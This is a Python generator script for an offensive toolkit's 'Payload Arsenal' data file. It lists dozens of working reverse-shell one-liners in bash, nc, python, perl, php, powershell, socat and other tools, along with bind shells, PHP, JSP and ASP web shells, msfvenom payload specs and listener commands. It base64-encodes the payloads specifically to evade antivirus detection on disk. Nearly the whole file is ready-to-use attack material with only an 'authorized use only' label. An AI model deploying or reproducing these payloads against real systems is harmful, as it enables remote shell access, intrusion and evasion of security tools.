#!/usr/bin/env python3
"""Regenerate toolkit/arsenal.dat — the Payload Arsenal dataset.

The arsenal module loads its payloads from a base64-encoded JSON blob rather than
a plain .py/.json so the raw reverse-shell strings don't trip antivirus on disk.
This script is the human-readable source of truth; run it to rebuild the blob:

    python tools/gen_arsenal.py

Placeholders {LHOST} / {LPORT} are filled in at runtime. Authorized use only.
"""
from __future__ import annotations

import base64
import json
from pathlib import Path

# --- reverse shells (call back to a listener) -------------------------------
REVERSE = {
    "bash -i":            "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
    "bash 196":           "0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196",
    "bash read-line":     "exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done",
    "bash udp":           "sh -i >& /dev/udp/{LHOST}/{LPORT} 0>&1",
    "sh -i":              "sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
    "nc -e":              "nc {LHOST} {LPORT} -e /bin/sh",
    "nc mkfifo":          "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
    "ncat -e":            "ncat {LHOST} {LPORT} -e /bin/bash",
    "ncat --ssl":         "ncat --ssl {LHOST} {LPORT} -e /bin/bash",
    "python":             "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/sh\")'",
    "python3":            "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'",
    "python3 short":      "export RHOST=\"{LHOST}\";export RPORT={LPORT};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
    "perl":               "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    "perl no-sh":         "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{LHOST}:{LPORT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
    "php exec":           "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "php system":         "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});system(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "php shell_exec":     "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "ruby":               "ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    "ruby no-sh":         "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{LHOST}\",\"{LPORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
    "socat":              "socat TCP:{LHOST}:{LPORT} EXEC:/bin/sh",
    "socat tty":          "socat TCP:{LHOST}:{LPORT} EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
    "powershell":         "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
    "awk":                "awk 'BEGIN {s = \"/inet/tcp/0/{LHOST}/{LPORT}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
    "node":               "node -e 'sh=require(\"child_process\").exec(\"/bin/bash\");var c=new require(\"net\").Socket();c.connect({LPORT},\"{LHOST}\",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});'",
    "lua":                "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{LHOST}','{LPORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
    "telnet":             "TF=$(mktemp -u);mkfifo $TF && telnet {LHOST} {LPORT} 0<$TF | /bin/sh 1>$TF",
    "openssl":            "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {LHOST}:{LPORT} > /tmp/s; rm /tmp/s",
    "zsh":                "zsh -c 'zmodload zsh/net/tcp && ztcp {LHOST} {LPORT} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
    "go":                 "echo 'package main;import(\"net\";\"os/exec\";\"time\");func main(){for{c,e:=net.Dial(\"tcp\",\"{LHOST}:{LPORT}\");if e!=nil{time.Sleep(5e9);continue};p:=exec.Command(\"/bin/sh\");p.Stdin=c;p.Stdout=c;p.Stderr=c;p.Run();c.Close()}}' > /tmp/t.go && go run /tmp/t.go",
}

# --- bind shells (listen on the target) -------------------------------------
BIND = {
    "nc -e":         "nc -lvnp {LPORT} -e /bin/sh",
    "nc mkfifo":     "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp {LPORT} >/tmp/f",
    "ncat --ssl":    "ncat --ssl -lvnp {LPORT} -e /bin/bash",
    "python":        "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",{LPORT}));s.listen(1);(c,a)=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn(\"/bin/sh\")'",
    "perl":          "perl -e 'use Socket;$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");};'",
    "php":           "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{LPORT});socket_listen($s);$c=socket_accept($s);while(1){socket_write($c,\"$ \");$cmd=socket_read($c,4096);socket_write($c,shell_exec($cmd));}'",
    "ruby":          "ruby -rsocket -e 'server=TCPServer.new({LPORT});while(c=server.accept);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end;end'",
    "socat":         "socat TCP-LISTEN:{LPORT},reuseaddr,fork EXEC:/bin/sh",
    "powershell":    "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$l = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{LPORT});$l.start();$c = $l.AcceptTcpClient();$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$by = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($by,0,$by.Length);$s.Flush()};$l.Stop()\"",
}

# --- web shells (drop on a webserver; ?cmd=) --------------------------------
WEB = {
    "php system":     "<?php system($_GET['cmd']); ?>",
    "php passthru":   "<?php passthru($_REQUEST['cmd']); ?>",
    "php exec":       "<?php echo shell_exec($_GET['c']); ?>",
    "php eval":       "<?php eval($_POST['x']); ?>",
    "php assert":     "<?php assert($_REQUEST['a']); ?>",
    "jsp":            "<%@ page import=\"java.util.*,java.io.*\"%><% if(request.getParameter(\"cmd\")!=null){ Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\")); BufferedReader d=new BufferedReader(new InputStreamReader(p.getInputStream())); String s; while((s=d.readLine())!=null){ out.println(s); } } %>",
    "asp":            "<% Set s=Server.CreateObject(\"WScript.Shell\"):Set c=s.Exec(Request.QueryString(\"cmd\")):Response.Write(c.StdOut.ReadAll()) %>",
    "aspx":           "<%@ Page Language=\"C#\"%><%@ Import Namespace=\"System.Diagnostics\"%><% var p=new Process();p.StartInfo.FileName=\"cmd.exe\";p.StartInfo.Arguments=\"/c \"+Request[\"cmd\"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd()); %>",
    "python cgi":     "#!/usr/bin/env python3\nimport cgi,os\nprint(\"Content-Type: text/plain\\n\")\nprint(os.popen(cgi.FieldStorage().getvalue(\"cmd\",\"\")).read())",
}

# --- msfvenom builders: name -> [payload, format, outfile] ------------------
MSF = {
    "windows x64 meterpreter": ["windows/x64/meterpreter/reverse_tcp", "exe", "shell.exe"],
    "windows x86 meterpreter": ["windows/meterpreter/reverse_tcp", "exe", "shell.exe"],
    "windows x64 shell":       ["windows/x64/shell_reverse_tcp", "exe", "shell.exe"],
    "linux x64 meterpreter":   ["linux/x64/meterpreter/reverse_tcp", "elf", "shell.elf"],
    "linux x86 meterpreter":   ["linux/x86/meterpreter/reverse_tcp", "elf", "shell.elf"],
    "macos x64 shell":         ["osx/x64/shell_reverse_tcp", "macho", "shell.macho"],
    "php meterpreter":         ["php/meterpreter/reverse_tcp", "raw", "shell.php"],
    "python meterpreter":      ["python/meterpreter/reverse_tcp", "raw", "shell.py"],
    "asp":                     ["windows/meterpreter/reverse_tcp", "asp", "shell.asp"],
    "aspx":                    ["windows/x64/meterpreter/reverse_tcp", "aspx", "shell.aspx"],
    "jsp":                     ["java/jsp_shell_reverse_tcp", "raw", "shell.jsp"],
    "war":                     ["java/jsp_shell_reverse_tcp", "war", "shell.war"],
    "powershell":              ["windows/x64/meterpreter/reverse_tcp", "psh", "shell.ps1"],
    "python cmd":              ["cmd/unix/reverse_python", "raw", "shell.py"],
    "bash":                    ["cmd/unix/reverse_bash", "raw", "shell.sh"],
    "android":                 ["android/meterpreter/reverse_tcp", "raw", "shell.apk"],
}

# --- listeners / handlers to catch a callback -------------------------------
LISTENER = {
    "nc":            "nc -lvnp {LPORT}",
    "rlwrap nc":     "rlwrap -cAr nc -lvnp {LPORT}",
    "ncat --ssl":    "ncat --ssl -lvnp {LPORT}",
    "socat":         "socat -d -d TCP-LISTEN:{LPORT},reuseaddr,fork STDOUT",
    "socat tty":     "socat file:$(tty),raw,echo=0 TCP-LISTEN:{LPORT}",
    "openssl":       "openssl req -x509 -newkey rsa:2048 -keyout k.pem -out c.pem -days 1 -nodes -subj '/CN=x' && openssl s_server -quiet -key k.pem -cert c.pem -port {LPORT}",
    "pwncat":        "pwncat-cs -lp {LPORT}",
    "metasploit":    "msfconsole -q -x \"use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; exploit\"",
}

DATA = {"reverse": REVERSE, "bind": BIND, "web": WEB, "msf": MSF, "listener": LISTENER}


def main() -> None:
    out = Path(__file__).resolve().parent.parent / "toolkit" / "arsenal.dat"
    blob = base64.b64encode(json.dumps(DATA).encode("utf-8"))
    out.write_bytes(blob)
    total = sum(len(v) for v in DATA.values())
    print(f"wrote {out}  ({len(blob)} b64 bytes)")
    for k, v in DATA.items():
        print(f"  {k:9} {len(v)}")
    print(f"  {'TOTAL':9} {total}")


if __name__ == "__main__":
    main()
